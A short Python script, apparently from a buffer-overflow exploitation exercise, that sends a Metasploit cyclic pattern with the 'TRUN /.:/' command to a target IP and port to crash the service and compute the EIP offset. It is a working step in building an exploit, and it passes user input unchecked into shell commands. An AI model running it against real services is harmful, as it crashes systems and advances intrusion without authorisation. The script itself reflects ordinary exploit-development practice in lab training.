#!/bin/python3

import sys, socket, subprocess

# get the ip and port from the command line arguments
ip = sys.argv[1]
port = int(sys.argv[2])
cmd = 'TRUN /.:/'
# check if the number of arguments passed to the script is exactly 2, but use 3 to check, do not ask me why.. with 2 it doesn't work!
if len(sys.argv) != 3:
    print("Error: Incorrect number of arguments provided.")
    print("Usage: ./Offset_finder.py IP PORT")
    sys.exit()

# get input from the user for the point where the fuzz.py script crashed
input1= input("Where did the fuzz.py crashed?  ")

# create the offset command using f-strings and metasploit pattern create with input1 as argument
offset_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {input1}'

# use subprocess.run to execute the offset command and capture the output in the offset variable
offset = subprocess.run(offset_command, shell=True, capture_output=True, text=True).stdout

# create a socket, connect to ip and port, send the offset string with the cmd vulnerable function, close the socket and wait for user to input the EIP value
# create a the exact_offset_command using metasploit pattern_offset, then use subprocess againt to capture the ecaxt_offset value and print it
try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send((cmd.encode('utf-8') + offset.encode('utf-8')))
        s.close()
        input2= input("what's the EIP value?  ")
        exact_offset_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {input1} -q {input2}'
        exact_offset = subprocess.run(exact_offset_command, shell=True, capture_output=True, text=True).stdout
        print(exact_offset)

except:
        sys.exit()
